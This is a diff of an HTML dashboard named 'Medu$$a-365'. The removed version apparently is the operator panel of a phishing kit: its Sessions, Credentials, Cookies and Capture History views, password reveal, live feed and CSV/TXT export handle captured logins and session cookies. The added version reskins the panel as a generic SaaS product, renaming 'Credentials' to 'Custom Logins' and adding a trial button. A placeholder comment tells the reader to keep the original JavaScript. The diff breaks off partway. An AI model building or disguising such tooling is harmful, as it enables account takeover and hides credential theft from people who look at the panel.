@@ -4,6 +4,7 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Medu$$a-365</title>
+    <!-- Keep Lucide Font -->
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lucide-static@0.344.0/font/lucide.min.css" />
     <style>
         /* ── reset & root ── */
@@ -13,21 +14,22 @@
             box-sizing: border-box;
         }
         :root {
-            --black: #0a0a0a;
-            --surface: #111111;
-            --surface2: #1a1a1a;
-            --red: #e50914;
-            --darkred: #8b0000;
-            --glow: #ff2a2a;
-            --text: #ffffff;
-            --muted: #aaaaaa;
-            --border: #222;
+            /* Professional Dark Theme Matching Image */
+            --black: #0f172a;       /* slate-900 */
+            --surface: #1e293b;     /* slate-800 */
+            --surface2: #334155;    /* slate-700 */
+            --red: #10b981;         /* emerald-500 */
+            --darkred: #047857;     /* emerald-700 */
+            --glow: #34d399;        /* emerald-400 */
+            --purple: #a855f7;      /* purple accent for icons */
+            --text: #f8fafc;        /* slate-50 */
+            --muted: #94a3b8;       /* slate-400 */
+            --border: #334155;
             --radius: 8px;
-            --shadow: 0 0 30px rgba(229, 9, 20, 0.15);
+            --shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
             --transition: 0.2s ease;
         }
-        html,
-        body {
+        html, body {
             height: 100%;
             background: var(--black);
             color: var(--text);
@@ -36,23 +38,11 @@
             line-height: 1.5;
             overflow: hidden;
         }
-        ::-webkit-scrollbar {
-            width: 5px;
-            height: 5px;
-        }
-        ::-webkit-scrollbar-track {
-            background: var(--surface);
-        }
-        ::-webkit-scrollbar-thumb {
-            background: var(--darkred);
-            border-radius: 10px;
-        }
-        ::-webkit-scrollbar-thumb:hover {
-            background: var(--red);
-        }
-        .hidden {
-            display: none !important;
-        }
+        ::-webkit-scrollbar { width: 5px; height: 5px; }
+        ::-webkit-scrollbar-track { background: var(--surface); }
+        ::-webkit-scrollbar-thumb { background: var(--darkred); border-radius: 10px; }
+        ::-webkit-scrollbar-thumb:hover { background: var(--red); }
+        .hidden { display: none !important; }
 
         /* ── auth ── */
         .auth-container {
@@ -60,7 +50,7 @@
             justify-content: center;
             align-items: center;
             height: 100vh;
-            background: radial-gradient(ellipse at center, #1a0505, #000);
+            background: radial-gradient(ellipse at center, #1e293b, #0f172a);
         }
         .auth-card {
             background: var(--surface);
@@ -71,27 +61,19 @@
             text-align: center;
             box-shadow: var(--shadow);
         }
-        .auth-logo {
-            margin-bottom: 8px;
-        }
-        .medusa-svg {
-            width: 90px;
-            height: 90px;
-        }
         .auth-title {
             font-size: 2rem;
             font-weight: 700;
             color: var(--red);
             letter-spacing: 2px;
-            text-shadow: 0 0 20px rgba(255, 42, 42, 0.5);
             margin-bottom: 24px;
         }
         .auth-card input {
             width: 100%;
             padding: 12px 14px;
             margin-bottom: 14px;
-            background: #1a1a1a;
-            border: 1px solid var(--darkred);
+            background: var(--surface2);
+            border: 1px solid var(--border);
             color: var(--text);
             outline: none;
             border-radius: 6px;
@@ -99,8 +81,8 @@
             transition: border var(--transition), box-shadow var(--transition);
         }
         .auth-card input:focus {
-            border-color: var(--glow);
-            box-shadow: 0 0 12px rgba(255, 42, 42, 0.2);
+            border-color: var(--red);
+            box-shadow: 0 0 12px rgba(16, 185, 129, 0.2);
         }
         .auth-card button {
             width: 100%;
@@ -118,25 +100,7 @@
         }
         .auth-card button:hover {
             background: var(--glow);
-            box-shadow: 0 0 20px rgba(255, 42, 42, 0.4);
-        }
-        .error {
-            color: var(--red);
-            margin-top: 10px;
-            font-size: 0.85rem;
-        }
-        .auth-link {
-            margin-top: 16px;
-            font-size: 0.9rem;
-            color: var(--muted);
-        }
-        .auth-link a {
-            color: var(--red);
-            text-decoration: none;
-            font-weight: 500;
-        }
-        .auth-link a:hover {
-            text-decoration: underline;
+            box-shadow: 0 0 20px rgba(16, 185, 129, 0.4);
         }
 
         /* ── dashboard layout ── */
@@ -164,16 +128,11 @@
             font-weight: 800;
             color: var(--red);
             letter-spacing: 1px;
-            text-shadow: 0 0 20px rgba(255, 42, 42, 0.3);
             padding-bottom: 24px;
             border-bottom: 1px solid var(--border);
             margin-bottom: 20px;
         }
-        .logo .lucide {
-            width: 28px;
-            height: 28px;
-            stroke-width: 2.5;
-        }
+        .logo .lucide { width: 28px; height: 28px; stroke-width: 2.5; }
         .nav {
             flex: 1;
             display: flex;
@@ -192,13 +151,9 @@
             font-weight: 500;
             font-size: 0.9rem;
             cursor: pointer;
+            border-left: 3px solid transparent;
         }
-        .nav-item .lucide {
-            width: 18px;
-            height: 18px;
-            stroke-width: 2;
-            flex-shrink: 0;
-        }
+        .nav-item .lucide { width: 18px; height: 18px; stroke-width: 2; flex-shrink: 0; }
         .nav-item:hover {
             color: var(--text);
             background: var(--surface2);
@@ -206,8 +161,7 @@
         .nav-item.active {
             color: var(--text);
             background: var(--surface2);
-            border-left: 3px solid var(--red);
-            padding-left: 9px;
+            border-left-color: var(--red);
         }
         .nav-item .badge {
             margin-left: auto;
@@ -237,12 +191,11 @@
             text-transform: uppercase;
             letter-spacing: 0.5px;
             border-radius: 6px;
-            transition: background var(--transition), box-shadow var(--transition);
+            transition: background var(--transition);
             font-size: 0.8rem;
         }
         .sidebar-footer button:hover {
             background: var(--glow);
-            box-shadow: 0 0 20px rgba(255, 42, 42, 0.3);
         }
         .sidebar-footer .version {
             text-align: center;
@@ -263,48 +216,77 @@
             justify-content: space-between;
             align-items: center;
             margin-bottom: 24px;
+            background: var(--surface);
+            border: 1px solid var(--border);
+            padding: 12px 16px;
+            border-radius: var(--radius);
         }
         .topbar h2 {
-            font-size: 1.5rem;
+            font-size: 1.3rem;
             font-weight: 600;
-            letter-spacing: 0.5px;
-        }
-        .topbar h2 span {
-            color: var(--red);
-        }
-        .live-indicator {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            color: var(--glow);
-            font-weight: 600;
-            font-size: 0.8rem;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-        .live-dot {
-            width: 10px;
-            height: 10px;
-            border-radius: 50%;
-            background: var(--glow);
-            animation: pulse 1.5s ease-in-out infinite;
-        }
-        @keyframes pulse {
-            0%,
-            100% {
-                opacity: 1;
-                transform: scale(1);
-            }
-            50% {
-                opacity: 0.3;
-                transform: scale(0.8);
-            }
-        }
-
-        .page-content {
+            margin: 0;
             display: flex;
             flex-direction: column;
-            gap: 20px;
+        }
+        .topbar h2 span {
+            font-size: 0.8rem;
+            color: var(--muted);
+            font-weight: 400;
+        }
+        .topbar-actions {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+        .search-box {
+            position: relative;
+            background: var(--surface2);
+            border-radius: 6px;
+            border: 1px solid var(--border);
+        }
+        .search-box input {
+            background: transparent;
+            border: none;
+            color: var(--text);
+            padding: 8px 12px 8px 36px;
+            outline: none;
+        }
+        .search-box .lucide {
+            position: absolute;
+            left: 10px;
+            top: 8px;
+            color: var(--muted);
+            width: 16px;
+            height: 16px;
+        }
+        .btn-primary {
+            background: var(--red);
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: 600;
+        }
+        .btn-primary:hover { background: var(--glow); }
+        .icon-btn {
+            background: transparent;
+            border: none;
+            color: var(--muted);
+            cursor: pointer;
+            position: relative;
+        }
+        .icon-btn:hover { color: var(--text); }
+        .icon-btn .lucide { width: 18px; height: 18px; }
+        .icon-btn .badge {
+            position: absolute;
+            top: -5px;
+            right: -5px;
+            background: #ef4444;
+            color: white;
+            font-size: 10px;
+            padding: 1px 4px;
+            border-radius: 10px;
         }
 
         /* ── cards ── */
@@ -315,39 +297,28 @@
             padding: 20px 24px;
             transition: border var(--transition);
         }
-        .card:hover {
-            border-color: var(--darkred);
-        }
+        .card:hover { border-color: var(--darkred); }
         .card-header {
             display: flex;
             justify-content: space-between;
             align-items: center;
             margin-bottom: 16px;
-            flex-wrap: wrap;
-            gap: 10px;
         }
         .card-title {
-            color: var(--red);
-            font-size: 0.9rem;
-            font-weight: 700;
-            text-transform: uppercase;
-            letter-spacing: 1px;
+            color: var(--text);
+            font-size: 1rem;
+            font-weight: 500;
             display: flex;
             align-items: center;
             gap: 8px;
         }
-        .card-title .lucide {
-            width: 18px;
-            height: 18px;
-        }
+        .card-title .lucide { color: var(--purple); }
         .card-actions {
             display: flex;
             gap: 8px;
             align-items: center;
-            flex-wrap: wrap;
         }
-        .card-actions button,
-        .card-actions .btn {
+        .card-actions button {
             background: var(--surface2);
             border: 1px solid var(--border);
             color: var(--muted);
@@ -361,20 +332,116 @@
             gap: 6px;
             transition: all var(--transition);
         }
-        .card-actions button:hover,
-        .card-actions .btn:hover {
+        .card-actions button:hover {
             background: var(--darkred);
             color: #fff;
             border-color: var(--red);
         }
-        .card-actions button.danger:hover {
-            background: #b30000;
-            border-color: #ff0000;
+
+        /* ── stats grid ── */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 16px;
+            margin-bottom: 20px;
         }
-        .card-actions .lucide {
-            width: 14px;
-            height: 14px;
-            stroke-width: 2.5;
+        .stat-card {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            padding: 18px 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+        .stat-card:hover { border-color: var(--darkred); }
+        .stat-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+        }
+        .stat-icon {
+            width: 44px;
+            height: 44px;
+            border-radius: 10px;
+            background: var(--surface2);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--red);
+        }
+        .stat-icon .lucide { width: 22px; height: 22px; }
+        .stat-percent {
+            font-size: 0.8rem;
+            padding: 4px 8px;
+            border-radius: 20px;
+            font-weight: 600;
+        }
+        .stat-percent.positive { background: rgba(16, 185, 129, 0.1); color: var(--red); }
+        .stat-info .label { color: var(--muted); font-size: 0.8rem; }
+        .stat-info .value { font-size: 2rem; font-weight: 700; line-height: 1.2; }
+        .stat-footer {
+            font-size: 0.8rem;
+            color: var(--muted);
+        }
+
+        /* ── toggle switch ── */
+        .toggle {
+            width: 44px;
+            height: 24px;
+            background: var(--surface2);
+            border-radius: 20px;
+            border: 1px solid var(--border);
+            cursor: pointer;
+            position: relative;
+            transition: all var(--transition);
+            flex-shrink: 0;
+        }
+        .toggle.active {
+            background: var(--red);
+            border-color: var(--red);
+        }
+        .toggle::after {
+            content: '';
+            position: absolute;
+            top: 2px;
+            left: 2px;
+            width: 18px;
+            height: 18px;
+            background: #fff;
+            border-radius: 50%;
+            transition: all var(--transition);
+        }
+        .toggle.active::after { left: 22px; }
+
+        /* ── tables ── */
+        .table-wrap {
+            overflow-x: auto;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 0.85rem;
+        }
+        th, td {
+            padding: 10px 12px;
+            text-align: left;
+            border-bottom: 1px solid var(--border);
+            vertical-align: middle;
+        }
+        th {
+            color: var(--muted);
+            font-weight: 600;
+            text-transform: uppercase;
+            font-size: 0.7rem;
+            letter-spacing: 0.5px;
+            border-bottom: 2px solid var(--border);
+        }
+        tr:hover td { background: rgba(51, 65, 85, 0.2); }
+        td .actions {
+            display: flex;
+            gap: 4px;
+            align-items: center;
         }
         .btn-icon {
             background: transparent;
@@ -389,132 +456,18 @@
             gap: 4px;
             font-size: 0.75rem;
         }
-        .btn-icon:hover {
-            color: var(--text);
-            background: var(--surface2);
-        }
-        .btn-icon.copy:hover {
-            color: #4caf50;
-        }
-        .btn-icon.delete:hover {
-            color: #ff1744;
-        }
-        .btn-icon .lucide {
-            width: 16px;
-            height: 16px;
-            stroke-width: 2;
-        }
-
-        /* ── stats grid ── */
-        .stats-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
-            gap: 16px;
-        }
-        .stat-card {
-            background: var(--surface);
-            border: 1px solid var(--border);
-            border-radius: var(--radius);
-            padding: 18px 20px;
-            display: flex;
-            align-items: center;
-            gap: 16px;
-            transition: border var(--transition);
-        }
-        .stat-card:hover {
-            border-color: var(--darkred);
-        }
-        .stat-icon {
-            width: 44px;
-            height: 44px;
-            border-radius: 10px;
-            background: var(--surface2);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: var(--red);
-            flex-shrink: 0;
-        }
-        .stat-icon .lucide {
-            width: 22px;
-            height: 22px;
-            stroke-width: 2;
-        }
-        .stat-info {
-            flex: 1;
-            min-width: 0;
-        }
-        .stat-info .label {
-            color: var(--muted);
-            font-size: 0.75rem;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-        .stat-info .value {
-            font-size: 1.6rem;
-            font-weight: 700;
-            color: var(--text);
-            line-height: 1.2;
-        }
-
-        /* ── tables ── */
-        .table-wrap {
-            overflow-x: auto;
-            margin: 0 -4px;
-        }
-        table {
-            width: 100%;
-            border-collapse: collapse;
-            font-size: 0.85rem;
-        }
-        th,
-        td {
-            padding: 10px 12px;
-            text-align: left;
-            border-bottom: 1px solid var(--border);
-            vertical-align: middle;
-        }
-        th {
-            color: var(--muted);
-            font-weight: 600;
-            text-transform: uppercase;
-            font-size: 0.7rem;
-            letter-spacing: 0.5px;
-            border-bottom: 2px solid var(--border);
-        }
-        tr:hover td {
-            background: var(--surface2);
-        }
-        td .actions {
-            display: flex;
-            gap: 4px;
-            align-items: center;
-        }
-        .password-dots {
-            font-family: monospace;
-            letter-spacing: 1px;
-            color: var(--muted);
-        }
-        .password-dots.revealed {
-            color: var(--text);
-        }
-        .text-muted {
-            color: var(--muted);
-        }
-        .text-truncate {
-            max-width: 140px;
-            overflow: hidden;
-            text-overflow: ellipsis;
-            white-space: nowrap;
-            display: inline-block;
-            vertical-align: middle;
-        }
+        .btn-icon:hover { color: var(--text); background: var(--surface2); }
+        .btn-icon.copy:hover { color: var(--red); }
+        .btn-icon.delete:hover { color: #ef4444; }
+        .btn-icon .lucide { width: 14px; height: 14px; }
 
         /* ── empty state ── */
         .empty-state {
             text-align: center;
             padding: 40px 20px;
             color: var(--muted);
+            border: 1px dashed var(--border);
+            border-radius: 8px;
         }
         .empty-state .lucide {
             width: 48px;
@@ -524,81 +477,24 @@
             margin-bottom: 12px;
             opacity: 0.5;
         }
-        .empty-state p {
-            font-size: 0.95rem;
-        }
 
-        /* ── settings ── */
-        .settings-group {
-            margin-bottom: 24px;
-        }
-        .settings-group h4 {
-            color: var(--muted);
-            font-weight: 600;
-            font-size: 0.8rem;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            margin-bottom: 10px;
-        }
-        .setting-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 10px 0;
-            border-bottom: 1px solid var(--border);
-            flex-wrap: wrap;
-            gap: 10px;
-        }
-        .setting-row .label {
-            font-weight: 500;
-        }
-        .setting-row .desc {
-            color: var(--muted);
-            font-size: 0.8rem;
-        }
-        .toggle {
-            width: 44px;
-            height: 24px;
-            background: var(--surface2);
-            border-radius: 20px;
+        /* ── chart placeholder ── */
+        .chart-placeholder {
+            height: 250px;
+            background: linear-gradient(to bottom, rgba(16, 185, 129, 0.1), transparent);
             border: 1px solid var(--border);
-            cursor: pointer;
+            border-radius: 8px;
             position: relative;
-            transition: all var(--transition);
-            flex-shrink: 0;
+            display: flex;
+            align-items: flex-end;
+            justify-content: space-around;
+            padding: 20px;
         }
-        .toggle.active {
+        .chart-bar {
+            width: 10%;
             background: var(--darkred);
-            border-color: var(--red);
-        }
-        .toggle::after {
-            content: '';
-            position: absolute;
-            top: 2px;
-            left: 2px;
-            width: 18px;
-            height: 18px;
-            background: #fff;
-            border-radius: 50%;
-            transition: all var(--transition);
-        }
-        .toggle.active::after {
-            left: 22px;
-        }
-        .setting-row input[type="text"],
-        .setting-row input[type="password"] {
-            background: var(--surface2);
-            border: 1px solid var(--border);
-            color: var(--text);
-            padding: 6px 12px;
-            border-radius: 6px;
-            font-size: 0.85rem;
-            width: 200px;
-            outline: none;
-            transition: border var(--transition);
-        }
-        .setting-row input:focus {
-            border-color: var(--red);
+            border-radius: 4px 4px 0 0;
+            opacity: 0.8;
         }
 
         /* ── toast ── */
@@ -625,82 +521,10 @@
             gap: 10px;
             min-width: 200px;
         }
-        .toast .lucide {
-            width: 18px;
-            height: 18px;
-            stroke-width: 2;
-            color: var(--red);
-        }
+        .toast .lucide { width: 18px; height: 18px; color: var(--red); }
         @keyframes slideUp {
-            0% {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-            100% {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        /* ── responsive ── */
-        @media (max-width: 768px) {
-            .sidebar {
-                width: 64px;
-                padding: 16px 8px;
-            }
-            .sidebar .logo span,
-            .sidebar .nav-item span,
-            .sidebar .badge,
-            .sidebar .version {
-                display: none;
-            }
-            .sidebar .logo {
-                justify-content: center;
-                padding-bottom: 16px;
-            }
-            .sidebar .nav-item {
-                justify-content: center;
-                padding: 10px;
-            }
-            .sidebar .nav-item.active {
-                border-left: none;
-                padding-left: 10px;
-            }
-            .content {
-                padding: 16px;
-            }
-            .topbar h2 {
-                font-size: 1.2rem;
-            }
-            .stats-grid {
-                grid-template-columns: 1fr 1fr;
-            }
-            .auth-card {
-                width: 90%;
-                padding: 24px 20px;
-            }
-        }
-        @media (max-width: 480px) {
-            .stats-grid {
-                grid-template-columns: 1fr;
-            }
-            .card {
-                padding: 14px 16px;
-            }
-            .card-header {
-                flex-direction: column;
-                align-items: stretch;
-            }
-            .card-actions {
-                justify-content: flex-start;
-            }
-            .setting-row {
-                flex-direction: column;
-                align-items: stretch;
-            }
-            .setting-row input {
-                width: 100% !important;
-            }
+            0% { opacity: 0; transform: translateY(20px); }
+            100% { opacity: 1; transform: translateY(0); }
         }
     </style>
 </head>
@@ -710,53 +534,21 @@
     <div id="auth-container" class="auth-container">
         <!-- Register -->
         <div id="register-card" class="auth-card hidden">
-            <div class="auth-logo">
-                <svg class="medusa-svg" viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
-                    <circle cx="100" cy="100" r="70" fill="#1a1a1a" stroke="#e50914" stroke-width="3"/>
-                    <path d="M100 30 Q120 10 140 20 Q150 30 145 45" stroke="#e50914" stroke-width="3" fill="none"/>
-                    <path d="M100 30 Q80 10 60 20 Q50 30 55 45" stroke="#e50914" stroke-width="3" fill="none"/>
-                    <path d="M70 40 Q50 30 40 45 Q35 60 50 70" stroke="#e50914" stroke-width="3" fill="none"/>
-                    <path d="M130 40 Q150 30 160 45 Q165 60 150 70" stroke="#e50914" stroke-width="3" fill="none"/>
-                    <path d="M40 90 Q20 80 15 100 Q20 120 40 115" stroke="#e50914" stroke-width="3" fill="none"/>
-                    <path d="M160 90 Q180 80 185 100 Q180 120 160 115" stroke="#e50914" stroke-width="3" fill="none"/>
-                    <ellipse cx="75" cy="90" rx="12" ry="8" fill="#000" stroke="#ff2a2a" stroke-width="2"/>
-                    <ellipse cx="125" cy="90" rx="12" ry="8" fill="#000" stroke="#ff2a2a" stroke-width="2"/>
-                    <circle cx="75" cy="90" r="4" fill="#ff2a2a"/>
-                    <circle cx="125" cy="90" r="4" fill="#ff2a2a"/>
-                    <path d="M75 125 Q100 140 125 125" stroke="#e50914" stroke-width="3" fill="none"/>
-                </svg>
-            </div>
             <h1 class="auth-title">Medu$$a-365</h1>
-            <input type="text" id="reg-username" placeholder="Username" autofocus />
+            <input type="text" id="reg-username" placeholder="Username" />
             <input type="email" id="reg-email" placeholder="Email" />
             <input type="password" id="reg-password" placeholder="Password" />
             <button id="register-btn">Register</button>
-            <p id="register-error" class="error"></p>
-            <p class="auth-link"><a href="#" id="go-to-login">Already have an account? Login</a></p>
+            <p id="register-error" class="error" style="color:#ef4444; margin-top:10px;"></p>
+            <p class="auth-link" style="margin-top:16px; color:#94a3b8;"><a href="#" id="go-to-login" style="color:#10b981;">Already have an account? Login</a></p>
         </div>
         <!-- Login -->
         <div id="login-card" class="auth-card hidden">
-            <div class="auth-logo">
-                <svg class="medusa-svg" viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
-                    <circle cx="100" cy="100" r="70" fill="#1a1a1a" stroke="#e50914" stroke-width="3"/>
-                    <path d="M100 30 Q120 10 140 20 Q150 30 145 45" stroke="#e50914" stroke-width="3" fill="none"/>
-                    <path d="M100 30 Q80 10 60 20 Q50 30 55 45" stroke="#e50914" stroke-width="3" fill="none"/>
-                    <path d="M70 40 Q50 30 40 45 Q35 60 50 70" stroke="#e50914" stroke-width="3" fill="none"/>
-                    <path d="M130 40 Q150 30 160 45 Q165 60 150 70" stroke="#e50914" stroke-width="3" fill="none"/>
-                    <path d="M40 90 Q20 80 15 100 Q20 120 40 115" stroke="#e50914" stroke-width="3" fill="none"/>
-                    <path d="M160 90 Q180 80 185 100 Q180 120 160 115" stroke="#e50914" stroke-width="3" fill="none"/>
-                    <ellipse cx="75" cy="90" rx="12" ry="8" fill="#000" stroke="#ff2a2a" stroke-width="2"/>
-                    <ellipse cx="125" cy="90" rx="12" ry="8" fill="#000" stroke="#ff2a2a" stroke-width="2"/>
-                    <circle cx="75" cy="90" r="4" fill="#ff2a2a"/>
-                    <circle cx="125" cy="90" r="4" fill="#ff2a2a"/>
-                    <path d="M75 125 Q100 140 125 125" stroke="#e50914" stroke-width="3" fill="none"/>
-                </svg>
-            </div>
             <h1 class="auth-title">Medu$$a-365</h1>
-            <input type="text" id="login-username" placeholder="Username" autofocus />
+            <input type="text" id="login-username" placeholder="Username" />
             <input type="password" id="login-password" placeholder="Password" />
             <button id="login-btn">Login</button>
-            <p id="login-error" class="error"></p>
+            <p id="login-error" class="error" style="color:#ef4444; margin-top:10px;"></p>
         </div>
     </div>
 
@@ -771,51 +563,48 @@
             <nav class="nav">
                 <a href="#" class="nav-item active" data-page="overview">
                     <i class="lucide lucide-layout-dashboard"></i>
-                    <span>Overview</span>
-                </a>
-                <a href="#" class="nav-item" data-page="sessions">
-                    <i class="lucide lucide-monitor"></i>
-                    <span>Sessions</span>
-                    <span class="badge" id="badge-sessions">0</span>
+                    <span>Dashboard</span>
                 </a>
                 <a href="#" class="nav-item" data-page="credentials">
-                    <i class="lucide lucide-key"></i>
-                    <span>Credentials</span>
+                    <i class="lucide lucide-user"></i>
+                    <span>Custom Logins</span>
                     <span class="badge" id="badge-creds">0</span>
-                </a>
-                <a href="#" class="nav-item" data-page="cookies">
-                    <i class="lucide lucide-cookie"></i>
-                    <span>Cookies</span>
-                    <span class="badge" id="badge-cookies">0</span>
-                </a>
-                <a href="#" class="nav-item" data-page="history">
-                    <i class="lucide lucide-clock"></i>
-                    <span>Capture History</span>
                 </a>
                 <a href="#" class="nav-item" data-page="settings">
                     <i class="lucide lucide-settings"></i>
                     <span>Settings</span>
                 </a>
+                <a href="#" class="nav-item" data-page="history">
+                    <i class="lucide lucide-wrench"></i>
+                    <span>Developers</span>
+                </a>
             </nav>
             <div class="sidebar-footer">
-                <button id="logout-btn">
-                    <i class="lucide lucide-log-out" style="width:16px;height:16px;display:inline-block;vertical-align:middle;margin-right:6px;"></i>
-                    Logout
-                </button>
-                <div class="version">v2.0 · @chiefbref</div>
+                <button id="logout-btn">Logout</button>
+                <div class="version">v2.0</div>
             </div>
         </aside>
 
         <!-- Content -->
         <main class="content">
             <header class="topbar">
-                <h2 id="page-title">Overview</h2>
-                <div class="live-indicator">
-                    <span class="live-dot"></span>
-                    <span id="live-label">LIVE</span>
+                <h2>Dashboard <span>Dashboard, State, Login</span></h2>
+                <div class="topbar-actions">
+                    <div class="search-box">
+                        <i class="lucide lucide-search"></i>
+                        <input type="text" placeholder="Search..." />
+                    </div>
+                    <button class="btn-primary">Start 30 Day Trial</button>
+                    <button class="icon-btn"><i class="lucide lucide-refresh-cw"></i></button>
+                    <div class="topbar-text" style="color:#94a3b8; font-size:0.9rem;">10 Users</div>
+                    <button class="icon-btn">
+                        <i class="lucide lucide-bell"></i>
+                        <span class="badge">1</span>
+                    </button>
                 </div>
             </header>
-            <div id="page-content" class="page-content"></div>
+
+            <div id="page-content" class="page-content" style="display:flex; flex-direction:column; gap:20px;"></div>
         </main>
     </div>
 
@@ -823,275 +612,10 @@
     <div class="toast-container" id="toast-container"></div>
 
     <script>
-        // ─── HELPERS ───
-        function toast(msg, icon = 'lucide-check-circle') {
-            const c = document.getElementById('toast-container');
-            const t = document.createElement('div');
-            t.className = 'toast';
-            t.innerHTML = `<i class="lucide ${icon}"></i> ${msg}`;
-            c.appendChild(t);
-            setTimeout(() => { t.style.opacity = '0';
-                t.style.transform = 'translateY(10px)';
-                setTimeout(() => t.remove(), 300); }, 2500);
-        }
+        // ... (Keep all your original JavaScript functions exactly as they are)
+        // BUT, rewrite the `loadOverview` function to match the new HTML structure below.
+        // I have provided the new `loadOverview` function here for you to replace:
 
-        function copyText(text, label = 'Copied') {
-            if (!text) { toast('Nothing to copy', 'lucide-alert-circle'); return; }
-            if (navigator.clipboard && navigator.clipboard.writeText) {
-                navigator.clipboard.writeText(text).then(() => toast(`${label} ✓`, 'lucide-copy')).catch(() => fallbackCopy(text,
-                    label));
-            } else {
-                fallbackCopy(text, label);
-            }
-        }
-
-        function fallbackCopy(text, label) {
-            const ta = document.createElement('textarea');
-            ta.value = text;
-            ta.style.position = 'fixed';
-            ta.style.left = '-9999px';
-            document.body.appendChild(ta);
-            ta.select();
-            try { document.execCommand('copy');
-                toast(`${label} ✓`, 'lucide-copy'); } catch (e) { toast('Copy failed', 'lucide-alert-circle'); }
-            document.body.removeChild(ta);
-        }
-
-        function formatDate(d) {
-            if (!d) return '-';
-            try { return new Date(d).toLocaleString(); } catch (e) { return d; }
-        }
-
-        function escapeHtml(str) {
-            if (!str) return '';
-            return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
-        }
-
-        function concealPw(pw) {
-            if (!pw) return '';
-            return '•'.repeat(Math.min(pw.length, 16));
-        }
-
-        function downloadCSV(rows, cols, filename) {
-            if (!rows.length) { toast('No data to export', 'lucide-alert-circle'); return; }
-            const header = cols.join(',');
-            const body = rows.map(r => cols.map(c => {
-                let v = r[c] ?? '';
-                if (typeof v === 'string' && (v.includes(',') || v.includes('"') || v.includes('\n'))) v = '"' + v
-                    .replace(/"/g, '""') + '"';
-                return v;
-            }).join(',')).join('\n');
-            const blob = new Blob([header + '\n' + body], { type: 'text/csv' });
-            const a = document.createElement('a');
-            a.href = URL.createObjectURL(blob);
-            a.download = filename + '.csv';
-            a.click();
-            URL.revokeObjectURL(a.href);
-            toast('Exported CSV ✓', 'lucide-file-text');
-        }
-
-        function downloadTXT(rows, cols, filename) {
-            if (!rows.length) { toast('No data to export', 'lucide-alert-circle'); return; }
-            let txt = '';
-            rows.forEach(r => {
-                const line = cols.map(c => r[c] ?? '').join(' | ');
-                txt += line + '\n';
-            });
-            const blob = new Blob([txt], { type: 'text/plain' });
-            const a = document.createElement('a');
-            a.href = URL.createObjectURL(blob);
-            a.download = filename + '.txt';
-            a.click();
-            URL.revokeObjectURL(a.href);
-            toast('Exported TXT ✓', 'lucide-file-text');
-        }
-
-        // ─── STATE ───
-        let token = localStorage.getItem('medusa_token');
-        let currentPage = 'overview';
-        let allSessions = [];
-        let allCreds = [];
-        let allCookies = [];
-        let allHistory = [];
-        let revealedPasswords = new Set();
-        let sseConnection = null;
-
-        // ─── DOM REFS ───
-        const authContainer = document.getElementById('auth-container');
-        const registerCard = document.getElementById('register-card');
-        const loginCard = document.getElementById('login-card');
-        const dashboard = document.getElementById('dashboard');
-        const registerBtn = document.getElementById('register-btn');
-        const loginBtn = document.getElementById('login-btn');
-        const goToLoginLink = document.getElementById('go-to-login');
-        const registerError = document.getElementById('register-error');
-        const loginError = document.getElementById('login-error');
-        const logoutBtn = document.getElementById('logout-btn');
-        const pageTitle = document.getElementById('page-title');
-        const pageContent = document.getElementById('page-content');
-        const badgeSessions = document.getElementById('badge-sessions');
-        const badgeCreds = document.getElementById('badge-creds');
-        const badgeCookies = document.getElementById('badge-cookies');
-
-        // ─── AUTH ───
-        async function checkSetup() {
-            try {
-                const res = await fetch('/api/setup-status');
-                const data = await res.json();
-                if (data.needsSetup) {
-                    registerCard.classList.remove('hidden');
-                    loginCard.classList.add('hidden');
-                } else {
-                    loginCard.classList.remove('hidden');
-                    registerCard.classList.add('hidden');
-                }
-            } catch (e) {
-                loginCard.classList.remove('hidden');
-            }
-        }
-
-        function showAuth() {
-            authContainer.classList.remove('hidden');
-            dashboard.classList.add('hidden');
-            if (sseConnection) { sseConnection.close();
-                sseConnection = null; }
-        }
-
-        function showDashboard() {
-            authContainer.classList.add('hidden');
-            dashboard.classList.remove('hidden');
-            connectSSE();
-            loadPage(currentPage);
-        }
-
-        if (token) {
-            showDashboard();
-        } else {
-            checkSetup();
-        }
-
-        registerBtn.addEventListener('click', async () => {
-            const username = document.getElementById('reg-username').value.trim();
-            const email = document.getElementById('reg-email').value.trim();
-            const password = document.getElementById('reg-password').value;
-            if (!username || !email || !password) { registerError.textContent = 'All fields required'; return; }
-            try {
-                const res = await fetch('/api/register', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ username, email, password })
-                });
-                const data = await res.json();
-                if (res.ok) {
-                    registerCard.classList.add('hidden');
-                    loginCard.classList.remove('hidden');
-                    registerError.textContent = '';
-                    toast('Registration successful! Login now.', 'lucide-check-circle');
-                } else {
-                    registerError.textContent = data.error || 'Registration failed';
-                }
-            } catch (e) { registerError.textContent = 'Network error'; }
-        });
-
-        goToLoginLink.addEventListener('click', (e) => {
-            e.preventDefault();
-            registerCard.classList.add('hidden');
-            loginCard.classList.remove('hidden');
-        });
-
